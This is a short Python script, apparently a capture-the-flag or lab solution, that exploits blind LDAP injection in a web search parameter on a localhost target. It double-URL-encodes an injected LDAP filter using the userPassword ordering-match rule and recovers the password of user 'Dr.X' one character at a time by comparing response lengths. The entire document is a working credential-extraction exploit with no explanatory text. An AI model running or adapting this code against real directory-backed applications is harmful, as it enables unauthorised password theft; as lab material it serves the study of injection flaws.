import requests, re, string

host = "http://localhost:1111/index.php?search="
alphabet = string.printable
user = "Dr.X"

def doublequote(s):
	return ''.join(["%25" + hex(ord(c))[2:] for c in s])

def quote(s):
	return ''.join(["%" + hex(ord(c))[2:] for c in s])

password = ""
for i in range(80):
	new = 100000
	_pass = ''.join(['\\'+hex(ord(c))[2:] for c in password])
	for j in range(32,127):
		payload = user + ")(userPassword:2.5.13.18:={}\\{}))(|(uid=*".format(_pass,hex(j)[2:])
		payload = doublequote(payload)
		url = host + payload
		r = requests.get(url).text
		l = len(r)
		if l<=new:
			new = l
		else:
			password += chr(j-1)
			print(password)
			break